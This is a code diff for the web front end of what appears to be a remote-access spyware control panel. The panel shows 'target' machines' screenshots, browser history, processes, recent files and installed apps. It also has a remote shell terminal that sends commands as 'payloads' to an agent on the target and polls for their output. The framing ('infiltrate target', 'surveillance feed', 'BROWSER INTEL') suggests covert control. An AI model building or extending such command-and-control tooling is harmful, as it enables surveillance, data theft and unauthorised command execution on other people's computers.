-                                       onkeypress="if(event.key==='Enter') runCommand()" autocomplete="off" spellcheck="false" />
-                                <button class="cmd-run-btn" onclick="runCommand()"><i class="fas fa-play"></i> Exec</button>
-                            </div>
-                            <div id="cmdOutput" class="cmd-output">root@${escHtml(machineId)}:~$ ready...</div>
-                        </div>
-                    </div>
-
-                    <!-- Apps -->
-                    <div class="m-card full-span">
-                        <div class="m-card-header"><h3><i class="fas fa-cube"></i> Installed Software</h3></div>
-                        <div class="m-card-body" style="max-height:180px;">
-                            ${apps.length ? apps.map(a => `<span class="app-chip">${escHtml(a)}</span>`).join('') : '<div class="no-data"><i class="fas fa-cube"></i>No data</div>'}
-                        </div>
-                    </div>
-
+            <!-- System Info -->
+            <div class="hud-card">
+                <div class="hud-card-header"><h3><i class="fas fa-microchip"></i> SYSTEM INTEL</h3></div>
+                <div style="font-size:13px;line-height:1.8;font-family:var(--font-code);">
+                    <div><span style="color:var(--text-sub);">OS:</span> ${escHtml(info.os || '--')}</div>
+                    <div><span style="color:var(--text-sub);">IP:</span> <span style="color:var(--cyan);">${escHtml(info.ip || '--')}</span></div>
+                    <div><span style="color:var(--text-sub);">Uptime:</span> ${escHtml(info.uptime || '--')}</div>
+                    <div><span style="color:var(--text-sub);">RAM:</span> ${info.memory_used || '--'} / ${info.memory_total || '--'} GB</div>
                 </div>
             </div>
-        `;
 
+            <!-- Browser History -->
+            <div class="hud-card">
+                <div class="hud-card-header"><h3><i class="fas fa-globe"></i> BROWSER INTEL (${history.length})</h3></div>
+                <div style="max-height:200px;overflow-y:auto;font-size:12px;font-family:var(--font-code);">
+                    ${history.length ? history.slice(0,25).map(h => `<div style="padding:4px 0;border-bottom:1px solid rgba(255,255,255,0.05);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" title="${escHtml(h.url)}">
+                        <span style="color:var(--cyan);font-weight:700;">[${escHtml(h.browser || 'Web')}]</span> ${escHtml(h.title || h.url)}
+                    </div>`).join('') : '<div style="color:var(--text-sub)">No history logs</div>'}
+                </div>
+            </div>
+
+            <!-- Processes -->
+            <div class="hud-card">
+                <div class="hud-card-header"><h3><i class="fas fa-list-check"></i> PROCESSES (${procs.length})</h3></div>
+                <div style="max-height:200px;overflow-y:auto;font-size:12px;font-family:var(--font-code);">
+                    ${procs.length ? procs.slice(0,20).map(p => `<div style="display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.05);">
+                        <span>${escHtml(p.name)}</span>
+                        <span style="color:var(--cyan)">CPU ${p.cpu}%</span>
+                    </div>`).join('') : '<div style="color:var(--text-sub)">No process data</div>'}
+                </div>
+            </div>
+
+            <!-- Recent Files -->
+            <div class="hud-card">
+                <div class="hud-card-header"><h3><i class="fas fa-file-code"></i> RECENT FILES</h3></div>
+                <div style="max-height:200px;overflow-y:auto;font-size:12px;font-family:var(--font-code);">
+                    ${files.length ? files.slice(0,15).map(f => `<div style="padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.05);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;" title="${escHtml(f)}">
+                        📄 ${escHtml(f.replace(/^\/Users\/[^\/]+\//, '~/'))}
+                    </div>`).join('') : '<div style="color:var(--text-sub)">No recent files</div>'}
+                </div>
+            </div>
+
+            <!-- Software -->
+            <div class="hud-card">
+                <div class="hud-card-header"><h3><i class="fas fa-cubes"></i> INSTALLED APPS</h3></div>
+                <div style="max-height:200px;overflow-y:auto;font-size:11px;font-family:var(--font-code);">
+                    ${apps.length ? apps.slice(0,30).map(a => `<span style="display:inline-block;background:var(--bg-base);padding:2px 8px;border-radius:4px;margin:2px;border:1px solid var(--border-color);">${escHtml(a)}</span>`).join('') : '<div style="color:var(--text-sub)">No app data</div>'}
+                </div>
+            </div>
+
+            <!-- REMOTE SHELL -->
+            <div class="hud-card full-span">
+                <div class="hud-card-header">
+                    <h3><i class="fas fa-terminal"></i> REMOTE COMMAND TERMINAL</h3>
+                    <span style="font-size:11px;color:var(--text-sub);">Logged Home Directory Active</span>
+                </div>
+                
+                <div class="term-input-group">
+                    <input type="text" id="cmdInput" placeholder="Enter shell command... e.g. ls ~/Desktop" onkeypress="if(event.key==='Enter') runRemoteCmd()">
+                    <button onclick="runRemoteCmd()"><i class="fas fa-play"></i> EXECUTE</button>
+                </div>
+
+                <div class="preset-cmds">
+                    <button class="preset-btn" onclick="execPreset('ls ~/Desktop')">📁 Desktop</button>
+                    <button class="preset-btn" onclick="execPreset('ls ~/Downloads')">📥 Downloads</button>
+                    <button class="preset-btn" onclick="execPreset('open -a \\'Microsoft Teams\\'')">💬 Teams</button>
+                    <button class="preset-btn" onclick="execPreset('open \\'https://www.youtube.com\\'')">🌐 YouTube</button>
+                    <button class="preset-btn" onclick="execPreset('whoami && pwd')">👤 User & Pwd</button>
+                </div>
+
+                <div class="cyber-term-output" id="cmdOutput">SYSTEM READY. Type a command or click a preset shortcut above...</div>
+            </div>
+
+        </div>`;
     } catch (e) {
-        console.error('Detail load error:', e);
-        modal.innerHTML += `<div style="padding:20px;text-align:center;color:var(--red);">☠ Failed to infiltrate target</div>`;
+        content.innerHTML = `<div style="padding:40px;color:var(--red-alert);text-align:center;">Failed to fetch target telemetry</div>`;
     }
 }
 
-// ==================== BUILD HELPERS ====================
-function buildScreenshot(machineId) {
-    return `<img class="screenshot" id="ssImage" src="/api/machine/${machineId}/screenshot?t=${Date.now()}" 
-            onerror="this.parentElement.innerHTML='<div class=\\'ss-placeholder\\'><i class=\\'fas fa-eye-slash\\'></i>No surveillance feed</div>'" />`;
+function refreshModalSS(id) {
+    const img = document.getElementById('modalSSImg');
+    if (img) img.src = `/api/machine/${id}/screenshot?t=${Date.now()}`;
 }
 
-function buildHistory(data) {
-    if (!data || !data.length) return '<div class="no-data"><i class="fas fa-globe"></i>No intel</div>';
-    return '<ul class="h-list">' + data.slice(0, 30).map(h => {
-        const cls = (h.browser || '').toLowerCase();
-        const title = (h.title || h.url || '').substring(0, 50);
-        return `<li><span class="h-badge ${cls}">${escHtml(h.browser || '?')}</span><span class="h-title" title="${escHtml(h.url || '')}">${escHtml(title)}</span></li>`;
-    }).join('') + '</ul>';
+function execPreset(cmd) {
+    document.getElementById('cmdInput').value = cmd;
+    runRemoteCmd();
 }
 
-function buildProcesses(data) {
-    if (!data || !data.length) return '<div class="no-data"><i class="fas fa-microchip"></i>No data</div>';
-    let html = '<table class="p-table"><tr><th>PID</th><th>Name</th><th>CPU%</th><th>Mem%</th></tr>';
-    data.slice(0, 30).forEach(p => {
-        const cls = p.cpu > 10 ? 'cpu-hi' : p.cpu > 2 ? 'cpu-md' : 'cpu-lo';
-        html += `<tr><td style="color:var(--text-muted)">${p.pid}</td><td>${escHtml((p.name || '').substring(0, 25))}</td><td class="${cls}">${p.cpu}</td><td style="color:var(--purple)">${p.mem}</td></tr>`;
-    });
-    return html + '</table>';
-}
-
-function buildFiles(data) {
-    if (!data || !data.length) return '<div class="no-data"><i class="fas fa-folder-open"></i>No files</div>';
-    return data.slice(0, 25).map(f => {
-        const short = f.replace(/^\/Users\/[^\/]+\//, '~/');
-        return `<div class="f-item" title="${escHtml(f)}">${escHtml(short)}</div>`;
-    }).join('');
-}
-
-function buildConnections(data) {
-    if (!data || !data.connections || !data.connections.length) return '<div class="no-data"><i class="fas fa-network-wired"></i>No connections</div>';
-    let html = '<table class="c-table"><tr><th>Local</th><th>Remote</th></tr>';
-    data.connections.slice(0, 15).forEach(c => {
-        html += `<tr><td>${escHtml(c.local)}</td><td>${escHtml(c.remote)}</td></tr>`;
-    });
-    return html + '</table>';
-}
-
-// ==================== SCREENSHOT CONTROLS ====================
-function downloadScreenshot(machineId) {
-    const link = document.createElement('a');
-    link.href = `/api/machine/${machineId}/screenshot?t=${Date.now()}`;
-    link.download = `screenshot_${machineId}_${new Date().toISOString().slice(0,19).replace(/[:-]/g,'')}.png`;
-    document.body.appendChild(link);
-    link.click();
-    document.body.removeChild(link);
-}
-
-function refreshScreenshot(machineId) {
-    const container = document.getElementById('modalScreenshot');
-    if (container && screenshotEnabled) {
-        container.innerHTML = buildScreenshot(machineId);
-    }
-}
-
-function toggleScreenshot() {
-    screenshotEnabled = !screenshotEnabled;
-    const btn = document.getElementById('ssToggleBtn');
-    const container = document.getElementById('modalScreenshot');
-    
-    if (screenshotEnabled) {
-        btn.className = 'ss-btn active';
-        btn.innerHTML = '<i class="fas fa-eye"></i> ON';
-        if (container && detailMachineId) container.innerHTML = buildScreenshot(detailMachineId);
-    } else {
-        btn.className = 'ss-btn danger';
-        btn.innerHTML = '<i class="fas fa-eye-slash"></i> OFF';
-        if (container) container.innerHTML = '<div class="ss-placeholder"><i class="fas fa-eye-slash"></i>Surveillance paused</div>';
-    }
-}
-
-// ==================== CLOSE MODAL ====================
-function closeModal() {
-    document.getElementById('modalOverlay').classList.remove('active');
-    document.body.style.overflow = '';
-    detailMachineId = null;
-}
-
-document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
-
-// ==================== REMOTE COMMAND (Polling-Based) ====================
-async function runCommand() {
-    if (!detailMachineId) return;
+async function runRemoteCmd() {
+    if (!currentDetailId) return;
     const input = document.getElementById('cmdInput');
     const output = document.getElementById('cmdOutput');
     const cmd = input.value.trim();
     if (!cmd) return;
 
-    output.textContent = 'root@' + detailMachineId + ':~$ ' + cmd + '\n[*] Queuing payload...';
-    output.className = 'cmd-output';
+    output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n[*] Dispatching command payload to target agent...`;
     input.value = '';
 
     try {
-        const res = await fetch(`/api/machine/${detailMachineId}/command`, {
+        const res = await fetch(`/api/machine/${currentDetailId}/command`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ command: cmd })
         });
-        const queueData = await res.json();
+        const data = await res.json();
         
-        if (!queueData.success) {
-            output.innerHTML = 'root@' + detailMachineId + ':~$ ' + cmd + '\n<span class="cmd-error">☠ ' + escHtml(queueData.error || 'Failed') + '</span>';
+        if (!data.success) {
+            output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n[×] Error: ${data.error || 'Failed'}`;
             return;
         }
 
-        const commandId = queueData.command_id;
-        output.textContent = 'root@' + detailMachineId + ':~$ ' + cmd + '\n[*] Payload delivered, awaiting execution...';
+        const cmdId = data.command_id;
+        output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n[+] Payload delivered. Executing on target agent...`;
 
-        let attempts = 0;
-        const maxAttempts = 20;
-        
-        const pollResult = async () => {
-            attempts++;
-            const bar = '█'.repeat(attempts) + '░'.repeat(maxAttempts - attempts);
-            output.textContent = 'root@' + detailMachineId + ':~$ ' + cmd + '\n[*] Executing... [' + bar + '] ' + Math.round(attempts * 1.5) + 's';
+        let polls = 0;
+        const pollStatus = async () => {
+            polls++;
+            output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n[+] Executing on target agent... (${polls}s)`;
             
             try {
-                const statusRes = await fetch(`/api/machine/${detailMachineId}/command/status/${commandId}`);
-                const statusData = await statusRes.json();
+                const sRes = await fetch(`/api/machine/${currentDetailId}/command/status/${cmdId}`);
+                const sData = await sRes.json();
                 
-                if (statusData.ready) {
-                    const result = statusData.result;
-                    if (result.success) {
-                        output.textContent = 'root@' + detailMachineId + ':~$ ' + cmd + '\n' + (result.output || '(no output)');
+                if (sData.ready) {
+                    const r = sData.result;
+                    if (r.success) {
+                        output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n\n${r.output || '[Command executed with no output]'}`;
                     } else {
-                        output.innerHTML = 'root@' + detailMachineId + ':~$ ' + cmd + '\n<span class="cmd-error">☠ ' + escHtml(result.error || 'Failed') + '</span>';
+                        output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n\n[×] Execution Error:\n${r.error}`;
                     }
                     return;
                 }
                 
-                if (attempts < maxAttempts) {
-                    setTimeout(pollResult, 1500);
-                } else {
-                    output.innerHTML = 'root@' + detailMachineId + ':~$ ' + cmd + '\n<span class="cmd-error">☠ Target unresponsive (30s timeout)</span>';
-                }
-            } catch(e) {
-                output.innerHTML = 'root@' + detailMachineId + ':~$ ' + cmd + '\n<span class="cmd-error">☠ Connection lost: ' + escHtml(e.message) + '</span>';
+                if (polls < 25) setTimeout(pollStatus, 1500);
+                else output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n\n[!] Timed out waiting for response`;
+            } catch (err) {
+                output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n\n[×] Network poll failed`;
             }
         };
-        
-        setTimeout(pollResult, 1500);
-        
-    } catch(e) {
-        output.innerHTML = 'root@' + detailMachineId + ':~$ ' + cmd + '\n<span class="cmd-error">☠ Network error: ' + escHtml(e.message) + '</span>';
+        setTimeout(pollStatus, 1500);
+
+    } catch (e) {
+        output.textContent = `SYSTEM@TARGET:~$ ${cmd}\n\n[×] Request failed: ${e.message}`;
     }
-    output.scrollTop = output.scrollHeight;
 }
 
-// ==================== REFRESH ====================
+function closeModal() {
+    document.getElementById('modalBackdrop').classList.remove('active');
+    currentDetailId = null;
+}
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+
 async function refreshAll() {
     if (isRefreshing) return;
     isRefreshing = true;
     const icon = document.getElementById('refreshIcon');
     icon.classList.add('fa-spin');
-    
     await loadMachines();
-    document.getElementById('lastUpdate').textContent = '[' + new Date().toLocaleTimeString() + ']';
-    
     icon.classList.remove('fa-spin');
     isRefreshing = false;
 }
 
-// ==================== INIT ====================
-loadMachines().then(() => {
-    document.getElementById('lastUpdate').textContent = '[' + new Date().toLocaleTimeString() + ']';
-});
-
-setInterval(() => { refreshAll(); }, 10000);
+loadMachines();
+setInterval(refreshAll, 10000);
 </script>
 
 </body>
